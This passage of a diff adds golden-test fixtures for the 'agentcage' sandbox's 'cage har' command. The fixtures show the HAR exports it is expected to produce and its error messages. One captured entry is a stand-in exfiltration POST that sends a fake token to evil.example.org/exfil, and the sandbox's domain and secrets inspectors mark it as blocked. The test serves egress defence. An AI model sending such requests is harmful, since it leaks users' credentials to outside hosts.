\\\"inspectors\\\": [{\\\"name\\\": \\\"entropy\\\", \\\"severity\\\": \\\"warning\\\", \\\"reason\\\": \\\"high-entropy body\\\"}], \\\"view\\\": \\\"inbound\\\"}\"\n      },\n      {\n        \"startedDateTime\": \"2024-01-01T00:02:00+00:00\",\n        \"time\": 0,\n        \"request\": {\n          \"method\": \"POST\",\n          \"url\": \"https://evil.example.org/exfil\",\n          \"httpVersion\": \"HTTP/1.1\",\n          \"cookies\": [],\n          \"headers\": [\n            {\n              \"name\": \"Host\",\n              \"value\": \"evil.example.org\"\n            },\n            {\n              \"name\": \"Content-Type\",\n              \"value\": \"application/x-www-form-urlencoded\"\n            }\n          ],\n          \"queryString\": [],\n          \"headersSize\": -1,\n          \"bodySize\": 27,\n          \"postData\": {\n            \"mimeType\": \"application/x-www-form-urlencoded\",\n            \"text\": \"token=FAKE-NOT-A-REAL-TOKEN\"\n          }\n        },\n        \"response\": {\n          \"status\": 0,\n          \"statusText\": \"\",\n          \"httpVersion\": \"HTTP/1.1\",\n          \"cookies\": [],\n          \"headers\": [],\n          \"content\": {\n            \"size\": 0,\n            \"mimeType\": \"\"\n          },\n          \"redirectURL\": \"\",\n          \"headersSize\": -1,\n          \"bodySize\": -1\n        },\n        \"cache\": {},\n        \"timings\": {\n          \"send\": -1,\n          \"wait\": -1,\n          \"receive\": -1\n        },\n        \"comment\": \"{\\\"flow_id\\\": \\\"flow-0003\\\", \\\"direction\\\": \\\"outbound\\\", \\\"decision\\\": \\\"blocked\\\", \\\"inspectors\\\": [{\\\"name\\\": \\\"domain\\\", \\\"severity\\\": \\\"error\\\", \\\"reason\\\": \\\"not in allowlist\\\"}, {\\\"name\\\": \\\"secrets\\\", \\\"severity\\\": \\\"critical\\\", \\\"reason\\\": \\\"credential in body\\\"}], \\\"view\\\": \\\"inbound\\\"}\"\n      },\n      {\n        \"startedDateTime\": \"2024-01-01T00:03:00+00:00\",\n        \"time\": 0,\n        \"request\": {\n          \"method\": \"PUT\",\n          \"url\": \"http://127.0.0.1:3000/hook\",\n          \"httpVersion\": \"HTTP/1.1\",\n          \"cookies\": [],\n          \"headers\": [\n            {\n              \"name\": \"Host\",\n              \"value\": \"127.0.0.1:3000\"\n            }\n          ],\n          \"queryString\": [],\n          \"headersSize\": -1,\n          \"bodySize\": 4,\n          \"postData\": {\n            \"mimeType\": \"\",\n            \"text\": \"ping\"\n          }\n        },\n        \"response\": {\n          \"status\": 204,\n          \"statusText\": \"No Content\",\n          \"httpVersion\": \"HTTP/1.1\",\n          \"cookies\": [],\n          \"headers\": [],\n          \"content\": {\n            \"size\": 0,\n            \"mimeType\": \"\"\n          },\n          \"redirectURL\": \"\",\n          \"headersSize\": -1,\n          \"bodySize\": 0\n        },\n        \"cache\": {},\n        \"timings\": {\n          \"send\": -1,\n          \"wait\": -1,\n          \"receive\": -1\n        },\n        \"comment\": \"{\\\"flow_id\\\": \\\"flow-0004\\\", \\\"direction\\\": \\\"inbound\\\", \\\"decision\\\": \\\"allowed\\\", \\\"inspectors\\\": [], \\\"view\\\": \\\"inbound\\\"}\"\n      },\n      {\n        \"startedDateTime\": \"2024-06-01T12:00:00+00:00\",\n        \"time\": 0,\n        \"request\": {\n          \"method\": \"HEAD\",\n          \"url\": \"https://cdn.example.com/a/b/c.bin\",\n          \"httpVersion\": \"HTTP/1.1\",\n          \"cookies\": [],\n          \"headers\": [\n            {\n              \"name\": \"Host\",\n              \"value\": \"cdn.example.com\"\n            }\n          ],\n          \"queryString\": [],\n          \"headersSize\": -1,\n          \"bodySize\": 0\n        },\n        \"response\": {\n          \"status\": 304,\n          \"statusText\": \"Not Modified\",\n          \"httpVersion\": \"HTTP/1.1\",\n          \"cookies\": [],\n          \"headers\": [\n            {\n              \"name\": \"ETag\",\n              \"value\": \"\\\"abc\\\"\"\n            }\n          ],\n          \"content\": {\n            \"size\": 0,\n            \"mimeType\": \"application/octet-stream\"\n          },\n          \"redirectURL\": \"\",\n          \"headersSize\": -1,\n          \"bodySize\": 0\n        },\n        \"cache\": {},\n        \"timings\": {\n          \"send\": -1,\n          \"wait\": -1,\n          \"receive\": -1\n        },\n        \"comment\": \"{\\\"flow_id\\\": \\\"flow-0005\\\", \\\"direction\\\": \\\"outbound\\\", \\\"decision\\\": \\\"allowed\\\", \\\"inspectors\\\": [{\\\"name\\\": \\\"content-type\\\", \\\"severity\\\": \\\"info\\\", \\\"reason\\\": \\\"binary\\\"}], \\\"view\\\": \\\"inbound\\\"}\"\n      }\n    ]\n  }\n}\n",
+      "stderr": ""
+    },
+    {
+      "name": "corpus-capture-outbound",
+      "why": "The same, in the view that carries real secrets.",
+      "argv": [
+        "cage",
+        "har",
+        "acme-agent",
+        "--view",
+        "outbound"
+      ],
+      "setup": [
+        {
+          "op": "copy",
+          "from": "tests/fixtures/golden/_inputs/capture.jsonl",
+          "path": ".local/share/agentcage/acme-agent/capture/capture.jsonl"
+        }
+      ],
+      "exit_code": 0,
+      "stdout": "{\n  \"log\": {\n    \"version\": \"1.2\",\n    \"creator\": {\n      \"name\": \"agentcage\",\n      \"version\": \"{VERSION}\"\n    },\n    \"entries\": [\n      {\n        \"startedDateTime\": \"2024-01-01T00:00:00+00:00\",\n        \"time\": 0,\n        \"request\": {\n          \"method\": \"GET\",\n          \"url\": \"https://api.example.com/v1/data?key=val&page=2\",\n          \"httpVersion\": \"HTTP/1.1\",\n          \"cookies\": [],\n          \"headers\": [\n            {\n              \"name\": \"Host\",\n              \"value\": \"api.example.com\"\n            },\n            {\n              \"name\": \"Accept\",\n              \"value\": \"application/json\"\n            },\n            {\n              \"name\": \"Authorization\",\n              \"value\": \"Bearer FAKE-NOT-A-REAL-TOKEN\"\n            }\n          ],\n          \"queryString\": [\n            {\n              \"name\": \"key\",\n              \"value\": \"val\"\n            },\n            {\n              \"name\": \"page\",\n              \"value\": \"2\"\n            }\n          ],\n          \"headersSize\": -1,\n          \"bodySize\": 0\n        },\n        \"response\": {\n          \"status\": 200,\n          \"statusText\": \"OK\",\n          \"httpVersion\": \"HTTP/1.1\",\n          \"cookies\": [],\n          \"headers\": [\n            {\n              \"name\": \"Content-Type\",\n              \"value\": \"application/json\"\n            }\n          ],\n          \"content\": {\n            \"size\": 11,\n            \"mimeType\": \"application/json\",\n            \"text\": \"{\\\"ok\\\":true}\"\n          },\n          \"redirectURL\": \"\",\n          \"headersSize\": -1,\n          \"bodySize\": 11\n        },\n        \"cache\": {},\n        \"timings\": {\n          \"send\": -1,\n          \"wait\": -1,\n          \"receive\": -1\n        },\n        \"comment\": \"{\\\"flow_id\\\": \\\"flow-0001\\\", \\\"direction\\\": \\\"outbound\\\", \\\"decision\\\": \\\"allowed\\\", \\\"inspectors\\\": [], \\\"view\\\": \\\"outbound\\\"}\"\n      },\n      {\n        \"startedDateTime\": \"2024-01-01T00:01:00+00:00\",\n        \"time\": 0,\n        \"request\": {\n          \"method\": \"POST\",\n          \"url\": \"https://upload.example.net/put\",\n          \"httpVersion\": \"HTTP/2.0\",\n          \"cookies\": [],\n          \"headers\": [\n            {\n              \"name\": \"Host\",\n              \"value\": \"upload.example.net\"\n            },\n            {\n              \"name\": \"Content-Type\",\n              \"value\": \"text/plain\"\n            }\n          ],\n          \"queryString\": [],\n          \"headersSize\": -1,\n          \"bodySize\": 27,\n          \"postData\": {\n            \"mimeType\": \"text/plain\",\n            \"text\": \"c2VjcmV0LWxvb2tpbmctYmxvYg==\",\n            \"encoding\": \"base64\"\n          }\n        },\n        \"response\": {\n          \"status\": 201,\n          \"statusText\": \"Created\",\n          \"httpVersion\": \"HTTP/2.0\",\n          \"cookies\": [],\n          \"headers\": [\n            {\n              \"name\": \"Content-Type\",\n              \"value\": \"text/plain\"\n            }\n          ],\n          \"content\": {\n            \"size\": 4,\n            \"mimeType\": \"text/plain\",\n            \"text\": \"b2s=\",\n            \"encoding\": \"base64\"\n          },\n          \"redirectURL\": \"\",\n          \"headersSize\": -1,\n          \"bodySize\": 4\n        },\n        \"cache\": {},\n        \"timings\": {\n          \"send\": -1,\n          \"wait\": -1,\n          \"receive\": -1\n        },\n        \"comment\": \"{\\\"flow_id\\\": \\\"flow-0002\\\", \\\"direction\\\": \\\"outbound\\\", \\\"decision\\\": \\\"flagged\\\", \\\"inspectors\\\": [{\\\"name\\\": \\\"entropy\\\", \\\"severity\\\": \\\"warning\\\", \\\"reason\\\": \\\"high-entropy body\\\"}], \\\"view\\\": \\\"outbound\\\"}\"\n      },\n      {\n        \"startedDateTime\": \"2024-01-01T00:02:00+00:00\",\n        \"time\": 0,\n        \"request\": {\n          \"method\": \"POST\",\n          \"url\": \"https://evil.example.org/exfil\",\n          \"httpVersion\": \"HTTP/1.1\",\n          \"cookies\": [],\n          \"headers\": [\n            {\n              \"name\": \"Host\",\n              \"value\": \"evil.example.org\"\n            },\n            {\n              \"name\": \"Content-Type\",\n              \"value\": \"application/x-www-form-urlencoded\"\n            }\n          ],\n          \"queryString\": [],\n          \"headersSize\": -1,\n          \"bodySize\": 27,\n          \"postData\": {\n            \"mimeType\": \"application/x-www-form-urlencoded\",\n            \"text\": \"token=FAKE-NOT-A-REAL-TOKEN\"\n          }\n        },\n        \"response\": {\n          \"status\": 0,\n          \"statusText\": \"\",\n          \"httpVersion\": \"HTTP/1.1\",\n          \"cookies\": [],\n          \"headers\": [],\n          \"content\": {\n            \"size\": 0,\n            \"mimeType\": \"\"\n          },\n          \"redirectURL\": \"\",\n          \"headersSize\": -1,\n          \"bodySize\": -1\n        },\n        \"cache\": {},\n        \"timings\": {\n          \"send\": -1,\n          \"wait\": -1,\n          \"receive\": -1\n        },\n        \"comment\": \"{\\\"flow_id\\\": \\\"flow-0003\\\", \\\"direction\\\": \\\"outbound\\\", \\\"decision\\\": \\\"blocked\\\", \\\"inspectors\\\": [{\\\"name\\\": \\\"domain\\\", \\\"severity\\\": \\\"error\\\", \\\"reason\\\": \\\"not in allowlist\\\"}, {\\\"name\\\": \\\"secrets\\\", \\\"severity\\\": \\\"critical\\\", \\\"reason\\\": \\\"credential in body\\\"}], \\\"view\\\": \\\"outbound\\\"}\"\n      },\n      {\n        \"startedDateTime\": \"2024-01-01T00:03:00+00:00\",\n        \"time\": 0,\n        \"request\": {\n          \"method\": \"PUT\",\n          \"url\": \"http://127.0.0.1:3000/hook\",\n          \"httpVersion\": \"HTTP/1.1\",\n          \"cookies\": [],\n          \"headers\": [\n            {\n              \"name\": \"Host\",\n              \"value\": \"127.0.0.1:3000\"\n            }\n          ],\n          \"queryString\": [],\n          \"headersSize\": -1,\n          \"bodySize\": 4,\n          \"postData\": {\n            \"mimeType\": \"\",\n            \"text\": \"ping\"\n          }\n        },\n        \"response\": {\n          \"status\": 204,\n          \"statusText\": \"No Content\",\n          \"httpVersion\": \"HTTP/1.1\",\n          \"cookies\": [],\n          \"headers\": [],\n          \"content\": {\n            \"size\": 0,\n            \"mimeType\": \"\"\n          },\n          \"redirectURL\": \"\",\n          \"headersSize\": -1,\n          \"bodySize\": 0\n        },\n        \"cache\": {},\n        \"timings\": {\n          \"send\": -1,\n          \"wait\": -1,\n          \"receive\": -1\n        },\n        \"comment\": \"{\\\"flow_id\\\": \\\"flow-0004\\\", \\\"direction\\\": \\\"inbound\\\", \\\"decision\\\": \\\"allowed\\\", \\\"inspectors\\\": [], \\\"view\\\": \\\"outbound\\\"}\"\n      },\n      {\n        \"startedDateTime\": \"2024-06-01T12:00:00+00:00\",\n        \"time\": 0,\n        \"request\": {\n          \"method\": \"HEAD\",\n          \"url\": \"https://cdn.example.com/a/b/c.bin\",\n          \"httpVersion\": \"HTTP/1.1\",\n          \"cookies\": [],\n          \"headers\": [\n            {\n              \"name\": \"Host\",\n              \"value\": \"cdn.example.com\"\n            }\n          ],\n          \"queryString\": [],\n          \"headersSize\": -1,\n          \"bodySize\": 0\n        },\n        \"response\": {\n          \"status\": 304,\n          \"statusText\": \"Not Modified\",\n          \"httpVersion\": \"HTTP/1.1\",\n          \"cookies\": [],\n          \"headers\": [\n            {\n              \"name\": \"ETag\",\n              \"value\": \"\\\"abc\\\"\"\n            }\n          ],\n          \"content\": {\n            \"size\": 0,\n            \"mimeType\": \"application/octet-stream\"\n          },\n          \"redirectURL\": \"\",\n          \"headersSize\": -1,\n          \"bodySize\": 0\n        },\n        \"cache\": {},\n        \"timings\": {\n          \"send\": -1,\n          \"wait\": -1,\n          \"receive\": -1\n        },\n        \"comment\": \"{\\\"flow_id\\\": \\\"flow-0005\\\", \\\"direction\\\": \\\"outbound\\\", \\\"decision\\\": \\\"allowed\\\", \\\"inspectors\\\": [{\\\"name\\\": \\\"content-type\\\", \\\"severity\\\": \\\"info\\\", \\\"reason\\\": \\\"binary\\\"}], \\\"view\\\": \\\"outbound\\\"}\"\n      }\n    ]\n  }\n}\n",
+      "stderr": "WARNING: --view outbound includes real secrets (API keys, tokens). Treat the output as sensitive.\n"
+    },
+    {
+      "name": "missing-cage",
+      "why": "No stored cage.yaml.",
+      "argv": [
+        "cage",
+        "har",
+        "no-such-cage"
+      ],
+      "setup": [],
+      "exit_code": 1,
+      "stdout": "",
+      "stderr": "error: cage 'no-such-cage' does not exist\n"
+    },
+    {
+      "name": "capture-disabled",
+      "why": "`capture: enable_har: false` and 'the file is not there yet' are the same error \u2014 there is no state that distinguishes them.",
+      "argv": [
+        "cage",
+        "har",
+        "plain-cage"
+      ],
+      "setup": [],
+      "exit_code": 1,
+      "stdout": "",
+      "stderr": "error: no capture file found for cage 'plain-cage'\n  Expected: {HOME}/.local/share/agentcage/plain-cage/capture/capture.jsonl\n\n  Add this to your cage.yaml and run `agentcage cage update`:\n    capture:\n      enable_har: true\n"
+    },
+    {
+      "name": "legacy-v021-cage",
+      "why": "The v0.22 gate, which exits 2 rather than 1.",
+      "argv": [
+        "cage",
+        "har",
+        "plain-cage"
+      ],
+      "setup": [
+        {
+          "op": "write",
+          "path": ".config/agentcage/cages/plain-cage/metadata.json",
+          "text": "{\"agentcage_version\": \"0.21.3\", \"network_octet\": 137}"
+        }
+      ],
+      "exit_code": 2,
+      "stdout": "",
+      "stderr": "error: cage 'plain-cage' was created with agentcage v0.21.3, which used the\n  legacy 3-service layout (cage / proxy / dns). v0.22 unified these into a\n  single 'egress' service. The cage cannot be addressed by v0.22 commands.\n\n  To migrate, run:\n    systemctl --user stop plain-cage-cage plain-cage-proxy plain-cage-dns\n    agentcage cage destroy plain-cage\n    agentcage cage create -c <your cage.yaml>\n\n"
+    },
+    {
+      "name": "no-metadata-reads-as-legacy",
+      "why": "A missing metadata.json defaults to v0.0.0 and trips the same gate.",
+      "argv": [
+        "cage",
+        "har",
+        "plain-cage"
+      ],
+      "setup": [
+        {
+          "op": "remove",
+          "path": ".config/agentcage/cages/plain-cage/metadata.json"
+        }
+      ],
+      "exit_code": 2,
+      "stdout": "",
+      "stderr": "error: cage 'plain-cage' was created with agentcage v0.0.0, which used the\n  legacy 3-service layout (cage / proxy / dns). v0.22 unified these into a\n  single 'egress' service. The cage cannot be addressed by v0.22 commands.\n\n  To migrate, run:\n    systemctl --user stop plain-cage-cage plain-cage-proxy plain-cage-dns\n    agentcage cage destroy plain-cage\n    agentcage cage create -c <your cage.yaml>\n\n"
+    }
+  ]
+}
